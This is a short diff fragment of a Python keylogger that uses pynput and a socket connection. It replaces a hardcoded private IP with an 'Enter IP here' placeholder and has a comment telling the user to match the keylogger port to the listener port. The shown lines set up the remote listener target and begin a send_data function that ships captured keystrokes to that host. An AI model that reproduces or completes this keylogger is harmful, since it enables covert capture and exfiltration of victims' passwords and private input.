@@ -2,8 +2,8 @@ import socket
 import pynput.keyboard
 
 # Define the target IP and port for the listener
-target_ip = "192.168.189.191"
-target_port = 9090
+target_ip = "Enter IP here" #Change this
+target_port = 9090 #Make sure that the keylogger port and the listener port is the same
 
 # Function to send data to listener
 def send_data(data):
